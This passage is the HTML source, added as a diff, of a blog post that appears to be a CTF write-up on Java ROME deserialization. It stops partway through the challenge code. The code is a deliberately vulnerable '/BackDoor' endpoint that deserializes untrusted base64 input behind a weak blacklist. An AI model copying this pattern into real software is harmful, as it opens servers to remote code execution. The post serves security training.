@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.134.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="https://www.snakin.top/posts/2021ezjaba/" />
+  <link rel="canonical" href="https://www.snakin.top/posts/2021ezjaba/" /><link rel="apple-touch-icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="https://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="https://www.snakin.top/index.xml" title="Snakinya-明烛天南">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/www.snakin.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2021陇原战疫 ezjaba",
+      "headline" : "CTF | 2021陇原战疫 ezjaba",
+      "description" : "考点： rome反序列化 不出网回显 解题 public class IndexController { public IndexController() { } @ResponseBody @RequestMapping({\u0026#34;\/\u0026#34;}) public String index() { return \u0026#34;Give you a cup of java, calm down\u0026#34;; } @ResponseBody @RequestMapping({\u0026#34;\/BackDoor\u0026#34;}) public String BackDoor(@RequestParam(name = \u0026#34;ctf\u0026#34;,required = true) String data) throws Exception { Set blacklist = new HashSet() { { this.add(\u0026#34;java.util.HashMap\u0026#34;); this.add(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); } }; Object object = null; byte[] b = Tool.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); BlacklistObjectInputStream ois = new BlacklistObjectInputStream(inputStream, blacklist); try { object = ois.readObject(); } catch (IOException var12) { var12.printStackTrace(); } catch (ClassNotFoundException var13) { var13.printStackTrace(); } finally { System.out.println(\u0026#34;information:\u0026#34; \u002b object.toString()); } return \u0026#34;calm down....\u0026#34;; } } ",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2022",
+      "datePublished": "2022-09-14 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2022-09-14 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/www.snakin.top\/posts\/2021ezjaba\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2021陇原战疫 ezjaba</title>
+  <meta property="og:title" content="CTF | 2021陇原战疫 ezjaba" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="考点： rome反序列化 不出网回显 解题 public class IndexController { public IndexController() { } @ResponseBody @RequestMapping({&#34;/&#34;}) public String index() { return &#34;Give you a cup of java, calm down&#34;; } @ResponseBody @RequestMapping({&#34;/BackDoor&#34;}) public String BackDoor(@RequestParam(name = &#34;ctf&#34;,required = true) String data) throws Exception { Set blacklist = new HashSet() { { this.add(&#34;java.util.HashMap&#34;); this.add(&#34;javax.management.BadAttributeValueExpException&#34;); } }; Object object = null; byte[] b = Tool.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); BlacklistObjectInputStream ois = new BlacklistObjectInputStream(inputStream, blacklist); try { object = ois.readObject(); } catch (IOException var12) { var12.printStackTrace(); } catch (ClassNotFoundException var13) { var13.printStackTrace(); } finally { System.out.println(&#34;information:&#34; &#43; object.toString()); } return &#34;calm down....&#34;; } } " />
+  <meta name="description" content="考点： rome反序列化 不出网回显 解题 public class IndexController { public IndexController() { } @ResponseBody @RequestMapping({&#34;/&#34;}) public String index() { return &#34;Give you a cup of java, calm down&#34;; } @ResponseBody @RequestMapping({&#34;/BackDoor&#34;}) public String BackDoor(@RequestParam(name = &#34;ctf&#34;,required = true) String data) throws Exception { Set blacklist = new HashSet() { { this.add(&#34;java.util.HashMap&#34;); this.add(&#34;javax.management.BadAttributeValueExpException&#34;); } }; Object object = null; byte[] b = Tool.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); BlacklistObjectInputStream ois = new BlacklistObjectInputStream(inputStream, blacklist); try { object = ois.readObject(); } catch (IOException var12) { var12.printStackTrace(); } catch (ClassNotFoundException var13) { var13.printStackTrace(); } finally { System.out.println(&#34;information:&#34; &#43; object.toString()); } return &#34;calm down....&#34;; } } " />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="https://www.snakin.top/favicon.ico" />
+  
+
+  
+    <style>.highlight{position:relative}.clipboard-button{color:var(--white);background-color:rgba(255,255,255,.786);border:none;border-radius:6px;padding:3px 5px 2px;font-size:1rem;position:absolute;z-index:1;right:0;top:0;margin:10px;transition:.1s;opacity:.5}.clipboard-button>svg{fill:var(--white)}.clipboard-button:hover,.clipboard-button:focus,pre:active~.clipboard-button,pre:focus~.clipboard-button,div.highlight:active>.clipboard-button,div.highlight:focus>.clipboard-button{cursor:pointer;opacity:1}</style>
+  
+  
+    <style>@import "https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/lxgwwenkaiscreenr.css";.busuanzi-footer{font-size:14px;color:#666;display:inline-block;gap:10px;align-items:center}.busuanzi-footer .separator{margin:0 5px;color:#999}.footer-beian{font-size:12px;color:#999;margin-top:5px;text-align:center}.footer-beian a{color:#0073e6;text-decoration:none}.footer-beian a:hover{text-decoration:underline}body{font-family:lxgw wenkai screen r,bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:40%;min-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none;word-break:break-all}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:1px;font-size:16px;font-weight:550;font-family:Consolas,Monaco,Menlo,Consolas,monospace;word-break:break-all;word-wrap:break-word;overflow-y:auto;max-height:300px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px;text-size-adjust:100%;-ms-text-size-adjust:100%;-moz-text-size-adjust:100%;-webkit-text-size-adjust:100%}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:150%}.site-date-catalog{font-size:2rem}.header-title{font-size:1.5rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px;font-weight:700}.header-item a:hover{font-weight:700;color:#8a2be2}.header-item a:visited{font-weight:700}.header-item a:active{font-weight:700}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px;text-align:center}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){article{max-width:100%;min-width:300px}.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}table{width:100%;color:#333;border-width:1px;border-color:#666;border-collapse:collapse}table th{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#dedede}table td{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#fff}.post-content a{color:#0969da;box-shadow:none;text-decoration:none}a:hover{font-weight:400}.post-content a:hover{text-decoration:underline}.footnotes{> hr { display: none; }}.footnotes ol{line-height:1.4;margin-bottom:20px}.footnotes li{margin-bottom:5px}.footnotes ol li p{margin:0;padding:0;line-height:1.4}.donation{display:block;margin-left:auto;margin-right:auto}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+  
+    <style>.toc{background-color:#f5f5f5;margin:0 auto;width:90%;border-radius:8px;padding:20px;box-shadow:0 4px 6px rgba(0,0,0,.1)}.toc ul{padding-left:20px}.toc li{line-height:1.6;margin-bottom:0}.toc li a{color:#333}.toc li a:hover{color:#000}.toc details{cursor:pointer}.toc summary{font-weight:700}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;padding-bottom:0;font-size:16px;max-height:83vh;overflow-y:auto}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya-明烛天南">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/books/" target="_self">Books</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/friends/" target="_self">Friends</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2021陇原战疫 ezjaba</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2022-09-14 00:00:00 UTC">
+                14 Sep 2022
+              </time>
+              
+            </div>
+            
+            <div class="col-xs-6">
+
+              
+              <div class="post-author">
+              <span id="busuanzi_container_page_pv">@本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+                
+            </div>
+          </div>
+          
+        </header>
+        
+
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e8%80%83%e7%82%b9" aria-label="考点：">考点：</a></li>
+                <li>
+                    <a href="#%e8%a7%a3%e9%a2%98" aria-label="解题">解题</a></li>
+                <li>
+                    <a href="#%e8%a1%a5%e5%85%85" aria-label="补充">补充</a><ul>
+                        
+                <li>
+                    <a href="#rome%e9%93%be%e7%bb%95%e8%bf%87%e9%bb%91%e5%90%8d%e5%8d%95" aria-label="rome链绕过黑名单">rome链绕过黑名单</a></li>
+                <li>
+                    <a href="#%e4%b8%8d%e5%87%ba%e7%bd%91%e5%9b%9e%e6%98%be%e4%b9%8b%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="不出网回显之内存马">不出网回显之内存马</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        
+
+
+
+        <div class="post-content markdown-body">
+          
+          <h3 id="考点">考点：</h3>
+<ul>
+<li>rome反序列化</li>
+<li>不出网回显</li>
+</ul>
+<h3 id="解题">解题</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">IndexController</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#57c7ff">IndexController</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@RequestMapping</span>({<span style="color:#5af78e">&#34;/&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">index</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;Give you a cup of java, calm down&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@RequestMapping</span>({<span style="color:#5af78e">&#34;/BackDoor&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">BackDoor</span>(<span style="color:#ff9f43">@RequestParam</span>(name <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;ctf&#34;</span>,required <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">true</span>) String data) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Set blacklist <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HashSet() {
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">this</span>.<span style="color:#57c7ff">add</span>(<span style="color:#5af78e">&#34;java.util.HashMap&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">this</span>.<span style="color:#57c7ff">add</span>(<span style="color:#5af78e">&#34;javax.management.BadAttributeValueExpException&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        Object object <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> b <span style="color:#ff6ac1">=</span> Tool.<span style="color:#57c7ff">base64Decode</span>(data);
+</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ByteArrayInputStream(b);
+</span></span><span style="display:flex;"><span>        BlacklistObjectInputStream ois <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> BlacklistObjectInputStream(inputStream, blacklist);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>            object <span style="color:#ff6ac1">=</span> ois.<span style="color:#57c7ff">readObject</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">catch</span> (IOException var12) {
+</span></span><span style="display:flex;"><span>            var12.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">catch</span> (ClassNotFoundException var13) {
+</span></span><span style="display:flex;"><span>            var13.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">finally</span> {
+</span></span><span style="display:flex;"><span>            System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(<span style="color:#5af78e">&#34;information:&#34;</span> <span style="color:#ff6ac1">+</span> object.<span style="color:#57c7ff">toString</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
